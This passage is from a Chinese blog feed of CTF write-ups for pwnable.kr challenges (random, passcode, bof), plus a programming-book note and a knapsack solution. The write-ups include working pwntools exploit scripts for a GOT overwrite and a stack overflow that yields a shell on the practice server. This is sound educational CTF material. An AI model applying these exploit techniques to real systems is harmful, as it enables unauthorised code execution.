<figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div></pre></td><td class="code"><pre><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></div><div class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> <span class="keyword">const</span> *argv[])</span></span></div><div class="line">&#123;</div><div class="line">	<span class="keyword">unsigned</span> <span class="keyword">int</span> random1;</div><div class="line">	random1 = rand();</div><div class="line">	<span class="built_in">printf</span>(<span class="string">"No srand():\n"</span>);</div><div class="line">	<span class="built_in">printf</span>(<span class="string">"random1 = %u\n"</span>, random1);</div><div class="line"></div><div class="line">	<span class="keyword">unsigned</span> <span class="keyword">int</span> random2;</div><div class="line">	srand(<span class="number">1</span>);</div><div class="line">	random2 = rand();</div><div class="line">	<span class="built_in">printf</span>(<span class="string">"srand(1):\n"</span>);</div><div class="line">	<span class="built_in">printf</span>(<span class="string">"random2 = %u\n"</span>, random2);</div><div class="line"></div><div class="line">	<span class="keyword">unsigned</span> <span class="keyword">int</span> random3;</div><div class="line">	srand(<span class="number">2</span>);</div><div class="line">	random3 = rand();</div><div class="line">	<span class="built_in">printf</span>(<span class="string">"srand(2):\n"</span>);</div><div class="line">	<span class="built_in">printf</span>(<span class="string">"random3 = %u\n"</span>, random3);</div><div class="line"></div><div class="line">	<span class="keyword">return</span> <span class="number">0</span>;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20170409/random/3.jpg?raw=true" alt=""></p>
<h1 id="Exp"><a href="#Exp" class="headerlink" title="Exp"></a>Exp</h1><p>由以上分析可知，v5的值其实是确定的，为 1804289383。<br>而判断条件(v5 ^ v4) == 0xDEADBEEF 等价于 v4 == 0xDEADBEEF ^ v5 。运算可得 1804289383 ^ 0xDEADBEEF = 3039230856。所以我们要给 v4 传入 3039230856 。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">random@ubuntu:~$ ./random</div><div class="line">3039230856                  </div><div class="line">Good!</div><div class="line">Mommy, I thought libc random is unpredictable...</div></pre></td></tr></table></figure>
<p>FLAG: Mommy, I thought libc random is unpredictable…</p>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;伪随机&lt;br&gt;
    
    </summary>
    
      <category term="二进制安全" scheme="http://yoursite.com/categories/%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%AE%89%E5%85%A8/"/>
    
    
      <category term="CTF" scheme="http://yoursite.com/tags/CTF/"/>
    
      <category term="pwn" scheme="http://yoursite.com/tags/pwn/"/>
    
      <category term="pwnable.kr" scheme="http://yoursite.com/tags/pwnable-kr/"/>
    
  </entry>
  
  <entry>
    <title>Pwnable.kr:passcode</title>
    <link href="http://yoursite.com/2017/04/08/Pwnable-kr-passcode/"/>
    <id>http://yoursite.com/2017/04/08/Pwnable-kr-passcode/</id>
    <published>2017-04-08T02:42:32.000Z</published>
    <updated>2017-04-14T16:12:58.499Z</updated>
    
    <content type="html"><![CDATA[<p>简单GOT覆写<br><a id="more"></a></p>
<h1 id="passcode"><a href="#passcode" class="headerlink" title="passcode"></a>passcode</h1><h2 id="main"><a href="#main" class="headerlink" title="main"></a>main</h2><p>先file看一下，32位。</p>
<p><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20170408/passcode/1.jpg?raw=true" alt=""></p>
<p>用IDA打开，f5</p>
<p><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20170408/passcode/2.jpg?raw=true" alt=""></p>
<p>可以看到，在调用完 welcome() 后立即调用了 login()。也就是说，welcome()栈帧的栈底 和 login()栈帧的栈底 是一样的。</p>
<h2 id="welcome（）"><a href="#welcome（）" class="headerlink" title="welcome（）"></a>welcome（）</h2><p><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20170408/passcode/3.jpg?raw=true" alt=""></p>
<p>通过 __isoc99_scanf() 读取name字符串，字符串大小为100。且由<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">int v1; // [sp+18h] [bp-10h]@0</div></pre></td></tr></table></figure></p>
<p>这一行可知，在 welcome() 的栈帧中，name字符串的起始位置在 ebp-70h 的地方。</p>
<h2 id="login（）"><a href="#login（）" class="headerlink" title="login（）"></a>login（）</h2><p><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20170408/passcode/4.jpg?raw=true" alt=""></p>
<p>这里分别通过<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">__isoc99_scanf(&quot;%d&quot;)</div></pre></td></tr></table></figure></p>
<p>来获得 passcode1 和 passcode2  的值。要注意的是，这里  scanf(“%d”) 中没有出现取地址符，也就是说，scanf(“%d”) 会直接把栈上的数据当作指针，并将读入的数据存放到这个“指针”指的“地址”上。</p>
<p><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20170408/passcode/7.jpg?raw=true" alt=""><br>以第一个红框为例，它对应着 passcode1 的读入。scanf的参数有两个，第一个是格式化字符串，第二个是地址表列。按照参数从右到左入栈。所以下面这段话，将 ebp-0x10 处的数据 放到了 esp+0x4 处 作为了 scanf的地址表项参数<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">804857c:	8b 55 f0             	mov    edx,DWORD PTR [ebp-0x10]</div><div class="line">804857f:	89 54 24 04          	mov    DWORD PTR [esp+0x4],edx</div></pre></td></tr></table></figure></p>
<p>scanf的第一个参数即 格式化字符串 由下面这两句话传入<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">8048577:	b8 83 87 04 08        mov    eax,0x8048783</div><div class="line">省略</div><div class="line">8048583:	89 04 24              mov    DWORD PTR [esp],eax</div></pre></td></tr></table></figure></p>
<p>0x8048783 处的数据如下：<br><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20170408/passcode/8.jpg?raw=true" alt=""><br>所以对于第一个 scanf(), 它的第二个参数的数值为在login（）栈帧的 ebp-0x10 处的数据。</p>
<p>对于passcode2 的分析同理。</p>
<h1 id="Check"><a href="#Check" class="headerlink" title="Check"></a>Check</h1><h2 id="Analysis"><a href="#Analysis" class="headerlink" title="Analysis"></a>Analysis</h2><p>从login（）的逻辑来看，只要 v1 = 0x528E6 和 0xCC07C9 程序就能执行到 return system（）。而且 welcome（）和 login（） 的 ebp 是相同的，有没有可能通过构造 welcome的输入 来控制 v1 v2 的值呢？</p>
<p>从前边的ida分析来看，在login（）的栈帧中，passcode1位置在 ebp-10h, 在welcome（）栈帧中，name字符串起始位置在 ebp-70h。由于welcome（）和login（）调用连续，他们的栈帧的ebp其实是一样的。如下图，两个栈帧对比如下：</p>
<p><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20170408/passcode/6.jpg?raw=true" alt=""></p>
<p>70h - 10h = 60h = 96 &lt; 100。也就是说，我们在welcome（）中输入的name的第 97 - 100 的字符，在 login（）栈帧中恰好是作为第一个 scanf 的第二个参数（即地址表项）。而在login（）中，调用第一次 scanf 时传入的 %d 将会写到这个地址中。这样我们能控制 passcode1。</p>
<p>用peda的checksec检查发现开启了canary保护<br><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20170408/passcode/5.jpg?raw=true" alt=""></p>
<p>由于passcode1已经是在长度为100的name的最后四个字节，因此不可能通过继续增加name的输入来控制 passcode2，否则会触发canary。</p>
<h2 id="科普：GOT"><a href="#科普：GOT" class="headerlink" title="科普：GOT"></a>科普：GOT</h2><p>linux中，ELF编译系统采用了一种叫延迟绑定（lazy binding）的技术。若ELF文件调用了定义在共享库中的函数，那ELF文件中就存在 GOT（全局偏移表） 和 PLT（过程链接表），其中GOT存放在 .data 段（已初始化的全局C变量），而PLT存放在 .text 段（已编译程序的机器代码）。对于一般函数，PLT表和GOT表一一对应。</p>
<p>当第一次调用共享库中的函数时，该函数对应的GOT表项中存放的是对应PLT表中的push1条目的地址。程序调用时，执行函数对应PLT的第一条指令时会先通过对应GOT跳转到PLT表中的下一条指令，之后通过一系列操作，将对应GOT覆盖为函数的真实地址，并执行该函数。等到下一次调用该函数时，程序一样先执行函数对应PLT的第一条指令，之后通过GOT表会直接执行该函数，因为GOT表中已经是函数的真实地址了。</p>
<h2 id="Thinking"><a href="#Thinking" class="headerlink" title="Thinking"></a>Thinking</h2><p>通过之前的分析，我们能通过控制name的最后四个字节，结合passcode1的scanf来实现对任意地址的写入。加上 GOT表是在 .data 段，是可写的。因此一个想法就是：我们可以将 printf 的GOT表 覆写为 system函数的地址。由前可知，当再次调用 printf 时，会通过 printf的GOT表执行 system函数。</p>
<p>printf 的 GOT地址可以通过 pwntools 工具获得。也可以通过 objdump 获得，如下.<br><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20170408/passcode/10.jpg?raw=true" alt=""></p>
<p>对于system函数地址，由于程序中已经提供了，所以这里直接取 80485e3</p>
<p><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20170408/passcode/12.jpg?raw=true" alt=""></p>
<p>这里对应着login（）中的<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">return system(&quot;/bin/cat flag&quot;);</div></pre></td></tr></table></figure></p>
<p>梳理一下思路：按照程序的流程，welcome（），我们输入100个字符，其中最后四个是 printf的GOT地址。之后程序进入login，调用scanf（”%d”）时，以 %d 形式将我们输入的数据（ system(“/bin/cat flag”)）读入，并写入到 printf的GOT地址。接下去，程序会执行 printf(“enter passcode2 : “); 即再次调用printf函数，但实际执行的是 system函数。<br>要注意的是，由于是以 %d 形式读入，所以输入时应为 134514147 （0x80485e3 = 134514147）</p>
<h1 id="Exp"><a href="#Exp" class="headerlink" title="Exp"></a>Exp</h1><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</div><div class="line"></div><div class="line">elf = ELF(<span class="string">"passcode"</span>)</div><div class="line">r = remote(<span class="string">"127.0.0.1"</span>,<span class="string">"12345"</span>)</div><div class="line"><span class="comment">#r = process("./passcode")</span></div><div class="line"></div><div class="line"></div><div class="line">printfGotAddr = elf.got[<span class="string">"printf"</span>]</div><div class="line">systemAddr = <span class="number">134514147</span></div><div class="line"></div><div class="line"><span class="keyword">print</span> <span class="string">"the printfGotAddr is "</span>+ hex(printfGotAddr)</div><div class="line"><span class="keyword">print</span> <span class="string">"the systemAddr is "</span>+ hex(systemAddr)</div><div class="line"></div><div class="line">payload1 = <span class="string">'a'</span> * <span class="number">96</span> + p32(printfGotAddr)</div><div class="line">payload2 = str(systemAddr)</div><div class="line">r.sendline(payload1)</div><div class="line">r.sendline(payload2)</div><div class="line"></div><div class="line"><span class="keyword">print</span> r.recv()</div></pre></td></tr></table></figure>
<h1 id="flag"><a href="#flag" class="headerlink" title="flag"></a>flag</h1><h2 id="local-test"><a href="#local-test" class="headerlink" title="local test"></a>local test</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div></pre></td><td class="code"><pre><div class="line">(venv) chybeta@ubuntu:~/pwn/pwnable/passcode$ python exp.py</div><div class="line">[*] &apos;/home/chybeta/pwn/pwnable/passcode/passcode&apos;</div><div class="line">    Arch:     i386-32-little</div><div class="line">    RELRO:    Partial RELRO</div><div class="line">    Stack:    Canary found</div><div class="line">    NX:       NX enabled</div><div class="line">    PIE:      No PIE</div><div class="line">[+] Opening connection to 127.0.0.1 on port 12345: Done</div><div class="line">the printfGotAddr is 0x804a000</div><div class="line">the systemAddr is 0x80485e3</div><div class="line">flag&#123;2222222222&#125;</div><div class="line">[*] Closed connection to 127.0.0.1 port 12345</div></pre></td></tr></table></figure>
<h2 id="pwnable-kr"><a href="#pwnable-kr" class="headerlink" title="pwnable.kr"></a>pwnable.kr</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div></pre></td><td class="code"><pre><div class="line">passcode@ubuntu:~$ ls</div><div class="line">flag  passcode	passcode.c</div><div class="line">passcode@ubuntu:~$ python</div><div class="line">Python 2.7.12 (default, Jul  1 2016, 15:12:24)</div><div class="line">[GCC 5.4.0 20160609] on linux2</div><div class="line">Type &quot;help&quot;, &quot;copyright&quot;, &quot;credits&quot; or &quot;license&quot; for more information.</div><div class="line">&gt;&gt;&gt; from pwn import *</div><div class="line">&gt;&gt;&gt; e = ELF(&quot;passcode&quot;)</div><div class="line">[*] &apos;/home/passcode/passcode&apos;</div><div class="line">    Arch:     i386-32-little</div><div class="line">    RELRO:    Partial RELRO</div><div class="line">    Stack:    Canary found</div><div class="line">    NX:       NX enabled</div><div class="line">    PIE:      No PIE</div><div class="line">&gt;&gt;&gt; r = process(&quot;./passcode&quot;)</div><div class="line">[x] Starting local process &apos;./passcode&apos;</div><div class="line">[+] Starting local process &apos;./passcode&apos;: Done</div><div class="line">&gt;&gt;&gt; printfGotAddr = e.got[&quot;printf&quot;]</div><div class="line">&gt;&gt;&gt; systemAddr = 134514147</div><div class="line">&gt;&gt;&gt; payload1 = &apos;a&apos; * 96 + p32(printfGotAddr)</div><div class="line">&gt;&gt;&gt; payload2 = str(systemAddr)</div><div class="line">&gt;&gt;&gt; r.sendline(payload1)</div><div class="line">&gt;&gt;&gt; r.sendline(payload2)</div><div class="line">&gt;&gt;&gt; print r.recv()</div><div class="line">[*] Process &apos;./passcode&apos; stopped with exit code 0</div><div class="line">Toddler&apos;s Secure Login System 1.0 beta.</div><div class="line">enter you name : Welcome aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa!</div><div class="line">Sorry mom.. I got confused about scanf usage :(</div><div class="line">enter passcode1 : Now I can safely trust you that you have credential :)</div></pre></td></tr></table></figure>
<p>FLAG: Sorry mom.. I got confused about scanf usage :(</p>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;简单GOT覆写&lt;br&gt;
    
    </summary>
    
      <category term="二进制安全" scheme="http://yoursite.com/categories/%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%AE%89%E5%85%A8/"/>
    
    
      <category term="CTF" scheme="http://yoursite.com/tags/CTF/"/>
    
      <category term="pwn" scheme="http://yoursite.com/tags/pwn/"/>
    
      <category term="pwnable.kr" scheme="http://yoursite.com/tags/pwnable-kr/"/>
    
  </entry>
  
  <entry>
    <title>Pwnable.kr:bof</title>
    <link href="http://yoursite.com/2017/04/07/Pwnable-kr-bof/"/>
    <id>http://yoursite.com/2017/04/07/Pwnable-kr-bof/</id>
    <published>2017-04-07T12:36:21.000Z</published>
    <updated>2017-04-07T13:01:02.795Z</updated>
    
    <content type="html"><![CDATA[<p>简单栈溢出。<br><a id="more"></a></p>
<h1 id="bof"><a href="#bof" class="headerlink" title="bof"></a>bof</h1><p>原题有提供binary和source code。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">(venv) chybeta@ubuntu:~/pwn/pwnable/bof$ file bof</div><div class="line">bof: ELF 32-bit LSB shared object, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 2.6.24, BuildID[sha1]=ed643dfe8d026b7238d3033b0d0bcc499504f273, not stripped</div></pre></td></tr></table></figure>
<p>用IDA打开，f5:</p>
<p>main函数：<br><img src="https://github.com/CHYbeta/chybeta.github.io/raw/master/images/pic/20170407/bof1.jpg?raw=true" alt=""></p>
<p>func函数：<br><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20170407/bof2.jpg?raw=true" alt=""></p>
<p>func函数接受一个参数（0xDEADBEEF），之后通过gets（）接受输入。因此可以通过栈溢出，将a1覆盖为0xCAFEBABE，这样能直接执行 system(“/bin/sh”)</p>
<p>a1 是 func（）的参数，在栈上位于 ebp+8h 的位置。而输入字符串的起点为 ebp-2ch。两者相差：0x2c + 0x8h = 52 。</p>
<h1 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h1><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</div><div class="line">p = remote(<span class="string">"pwnable.kr"</span>,<span class="string">"9000"</span>)</div><div class="line">payload = <span class="string">'a'</span> * <span class="number">52</span></div><div class="line">payload += p32(<span class="number">0xcafebabe</span>)</div><div class="line">p.sendline(payload)</div><div class="line">p.interactive()</div></pre></td></tr></table></figure>
<h1 id="flag"><a href="#flag" class="headerlink" title="flag"></a>flag</h1><p><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20170407/bof3.jpg?raw=true" alt=""></p>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;简单栈溢出。&lt;br&gt;
    
    </summary>
    
      <category term="二进制安全" scheme="http://yoursite.com/categories/%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%AE%89%E5%85%A8/"/>
    
    
      <category term="CTF" scheme="http://yoursite.com/tags/CTF/"/>
    
      <category term="pwn" scheme="http://yoursite.com/tags/pwn/"/>
    
      <category term="pwnable.kr" scheme="http://yoursite.com/tags/pwnable-kr/"/>
    
  </entry>
  
  <entry>
    <title>《The Pracetice of Programming》读书笔记（1）</title>
    <link href="http://yoursite.com/2017/04/06/%E3%80%8AThe-Pracetice-of-Programming%E3%80%8B%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0%EF%BC%881%EF%BC%89/"/>
    <id>http://yoursite.com/2017/04/06/《The-Pracetice-of-Programming》读书笔记（1）/</id>
    <published>2017-04-06T07:46:47.000Z</published>
    <updated>2017-04-06T08:04:34.647Z</updated>
    
    <content type="html"><![CDATA[<p>《The Pracetice of Programming》读书笔记<br><a id="more"></a></p>
<h1 id="Style"><a href="#Style" class="headerlink" title="Style"></a>Style</h1><ul>
<li><p>Usually,the real code is mostly well down,but with something that could be improved.</p>
</li>
<li><p>There is more to writing a program than getting the syntax right, fixing the bugs, and making it run fast enough.</p>
</li>
<li><p>The principles of programming style are based on common sense guided by experience.</p>
</li>
</ul>
<h2 id="Names"><a href="#Names" class="headerlink" title="Names"></a>Names</h2><ul>
<li><p>labels an object and conveys information about its purpose.</p>
</li>
<li><p>informative、concise、memorable, and pronounceable if possible</p>
</li>
<li><p>the border the scope,the more information conveyed.</p>
</li>
</ul>
<h3 id="suggestion-1"><a href="#suggestion-1" class="headerlink" title="suggestion 1"></a>suggestion 1</h3><p>use descriptive name for globals,short names for locals.</p>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;《The Pracetice of Programming》读书笔记&lt;br&gt;
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>ACMXMU-OJ:1316</title>
    <link href="http://yoursite.com/2017/04/06/ACMXMU-OJ-1316/"/>
    <id>http://yoursite.com/2017/04/06/ACMXMU-OJ-1316/</id>
    <published>2017-04-06T05:50:42.000Z</published>
    <updated>2017-04-06T06:00:33.771Z</updated>
    
    <content type="html"><![CDATA[<h1 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h1><h2 id="Description"><a href="#Description" class="headerlink" title="Description"></a>Description</h2><p>有一辆最大载重M公斤的卡车和N种货物，已知第i种货物有wi公斤,其总价值为vi元。每种货物都可以取任意数量装入卡车。试确定装货方案，使得装入卡车的所有物品总价值最大。<br><a id="more"></a></p>
<h2 id="Input"><a href="#Input" class="headerlink" title="Input"></a>Input</h2><p>第一行是两个整数M，N(0&lt;M,N&lt;100000)。接下来的N行，每一行有两个整数wi，vi(0&lt;wi&lt;=100,0&lt;vi&lt;=100)，分别代表第i种货物的总重量和总价值。</p>
<h2 id="Output"><a href="#Output" class="headerlink" title="Output"></a>Output</h2><p>输出卡车能装入货物的最大价值，保留6位小数。</p>
<h2 id="Sample-Input"><a href="#Sample-Input" class="headerlink" title="Sample Input"></a>Sample Input</h2><p>10 3</p>
<p>10 10</p>
<p>5 6</p>
<p>20 50</p>
<h2 id="Sample-Output"><a href="#Sample-Output" class="headerlink" title="Sample Output"></a>Sample Output</h2><p>25.000000</p>
<h1 id="想法"><a href="#想法" class="headerlink" title="想法"></a>想法</h1><p>贪心算法。背包问题。有别于0/1背包问题。<br>每次选取尽量多的单位价值高的物体。</p>
<h1 id="提交"><a href="#提交" class="headerlink" title="提交"></a>提交</h1><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div><div class="line">74</div><div class="line">75</div><div class="line">76</div><div class="line">77</div><div class="line">78</div><div class="line">79</div><div class="line">80</div><div class="line">81</div><div class="line">82</div></pre></td><td class="code"><pre><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;algorithm&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></div><div class="line"></div><div class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</div><div class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span> unit&#123;</div><div class="line">    <span class="keyword">double</span> unitValue;</div><div class="line">    <span class="keyword">int</span> id;</div><div class="line">    <span class="keyword">double</span> weight;</div><div class="line">    <span class="keyword">double</span> value;</div><div class="line">&#125;unit;</div><div class="line"><span class="function"><span class="keyword">void</span> <span class="title">quick_sort</span><span class="params">(unit s[], <span class="keyword">int</span> l, <span class="keyword">int</span> r)</span></span>;</div><div class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></div><div class="line">&#123;</div><div class="line">    <span class="keyword">double</span> m,n;</div><div class="line">    <span class="keyword">static</span> unit valuesor[<span class="number">100010</span>];</div><div class="line">    <span class="built_in">scanf</span>(<span class="string">"%lf%lf"</span>,&amp;m,&amp;n);</div><div class="line">    <span class="keyword">int</span> i;</div><div class="line">    <span class="keyword">for</span> (i = <span class="number">1</span>; i &lt;= n; i++)&#123;</div><div class="line">        <span class="built_in">scanf</span>(<span class="string">"%lf%lf"</span>,&amp;valuesor[i].weight,&amp;valuesor[i].value);</div><div class="line">        valuesor[i].unitValue = (<span class="keyword">double</span>)valuesor[i].value / (<span class="keyword">double</span>)valuesor[i].weight;</div><div class="line">        valuesor[i].id = i;</div><div class="line">    &#125;</div><div class="line"></div><div class="line">    quick_sort(valuesor,<span class="number">1</span>,n);</div><div class="line"></div><div class="line">    <span class="keyword">double</span> remainSpace = m;</div><div class="line">    <span class="keyword">double</span> allValue = <span class="number">0</span>;</div><div class="line">    i = <span class="number">1</span>;</div><div class="line">    <span class="keyword">for</span> (i = <span class="number">1</span>; i &lt;= n ; i++)&#123;</div><div class="line">        <span class="keyword">if</span> (remainSpace &lt;= <span class="number">0</span>)</div><div class="line">            <span class="keyword">break</span>;</div><div class="line">        <span class="keyword">if</span> (valuesor[i].weight &lt;= remainSpace)&#123;</div><div class="line">            remainSpace = remainSpace - valuesor[i].weight;</div><div class="line">            allValue += valuesor[i].value;</div><div class="line">        &#125;<span class="keyword">else</span>&#123;</div><div class="line">            allValue += remainSpace *valuesor[i].unitValue;</div><div class="line">            remainSpace = <span class="number">0</span>;</div><div class="line">        &#125;</div><div class="line">    &#125;</div><div class="line">    <span class="built_in">printf</span>(<span class="string">"%lf\n"</span>,allValue);</div><div class="line">    <span class="keyword">return</span> <span class="number">0</span>;</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">void</span> <span class="title">quick_sort</span><span class="params">(unit s[], <span class="keyword">int</span> l, <span class="keyword">int</span> r)</span></span></div><div class="line">&#123;</div><div class="line">    <span class="keyword">if</span> (l &lt; r)</div><div class="line">    &#123;</div><div class="line">        <span class="keyword">int</span> i = l, j = r;</div><div class="line">        unit x = s[l];</div><div class="line"></div><div class="line">        <span class="keyword">while</span> (i &lt; j)</div><div class="line">        &#123;</div><div class="line">            <span class="keyword">while</span>(i &lt; j &amp;&amp; s[j].unitValue &lt;= x.unitValue)</div><div class="line">                j--;</div><div class="line">            <span class="keyword">if</span>(i &lt; j)&#123;</div><div class="line">                s[i].unitValue = s[j].unitValue;</div><div class="line">                s[i].id = s[j].id;</div><div class="line">                s[i].value = s[j].value;</div><div class="line">                s[i].weight = s[j].weight;</div><div class="line">                i++;</div><div class="line">            &#125;</div><div class="line"></div><div class="line">            <span class="keyword">while</span>(i &lt; j &amp;&amp; s[i].unitValue &gt;= x.unitValue)</div><div class="line">                i++;</div><div class="line">            <span class="keyword">if</span>(i &lt; j)&#123;</div><div class="line">                s[j].unitValue = s[i].unitValue;</div><div class="line">                s[j].id = s[i].id;</div><div class="line">                s[j].value = s[i].value;</div><div class="line">                s[j].weight = s[i].weight;</div><div class="line">                j--;</div><div class="line">            &#125;</div><div class="line">        &#125;</div><div class="line">        s[i].id = x.id;</div><div class="line">        s[i].unitValue = x.unitValue;</div><div class="line">        s[i].value = x.value;</div><div class="line">        s[i].weight = x.weight;</div><div class="line">        quick_sort(s, l, i - <span class="number">1</span>);</div><div class="line">        quick_sort(s, i + <span class="number">1</span>, r);</div><div class="line">    &#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;题目&quot;&gt;&lt;a href=&quot;#题目&quot; class=&quot;headerlink&quot; title=&quot;题目&quot;&gt;&lt;/a&gt;题目&lt;/h1&gt;&lt;h2 id=&quot;Description&quot;&gt;&lt;a href=&quot;#Description&quot; class=&quot;headerlink&quot; title=&quot;Description&quot;&gt;&lt;/a&gt;Description&lt;/h2&gt;&lt;p&gt;有一辆最大载重M公斤的卡车和N种货物，已知第i种货物有wi公斤,其总价值为vi元。每种货物都可以取任意数量装入卡车。试确定装货方案，使得装入卡车的所有物品总价值最大。&lt;br&gt;
    
    </summary>
    
      <category term="编程练习" scheme="http://yoursite.com/categories/%E7%BC%96%E7%A8%8B%E7%BB%83%E4%B9%A0/"/>
    
    
      <category term="编程练习" scheme="http://yoursite.com/tags/%E7%BC%96%E7%A8%8B%E7%BB%83%E4%B9%A0/"/>
    
      <category term="算法" scheme="http://yoursite.com/tags/%E7%AE%97%E6%B3%95/"/>
    
